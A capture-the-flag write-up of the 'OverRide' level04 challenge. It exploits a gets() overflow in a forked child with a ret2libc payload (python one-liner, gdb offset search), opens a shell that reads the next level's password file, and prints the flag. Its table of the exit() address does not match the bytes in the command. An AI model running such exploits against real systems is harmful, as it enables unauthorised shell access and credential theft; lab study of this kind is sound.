# Ret2libc again x2

## Program summary
In this level we are provided with a program which takes a ShellCode as input.

```
level04@OverRide:~$ ./level04
Give me some shellcode, k
```

Basically this program launches a **`fork()`**, and in this process we have a **`gets()`** for the input of ShellCode.

## Vulnerability
Since the stack will be popped in a classic way, we can use a ret2libc exploiting gets which has no forward and backward checks

## Attack design
In order to calculate the offset we will do as usual, inject the pattern and calculate it, however we will need to set a special option in order to access the child correctly: **`set follow-fork-mode child`**

```
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04
[New process 2131]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2131]
0x41326641 in ?? ()
```

Here is the payload that we will inject :

B * 156 -> ***OFFSET***
\xd0\xae\xe6\xf7 -> **`system()`** addr
\xd0\xae\xe6\xf7 -> **`exit()`** addr
\xec\x97\xf8\xf7 -> **`"/bin/sh"`** string addr

```py
python -c "print 'B' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'" > /tmp/boom
```

```
level04@OverRide:~$ cat /tmp/boom - | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

> Flag : `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`
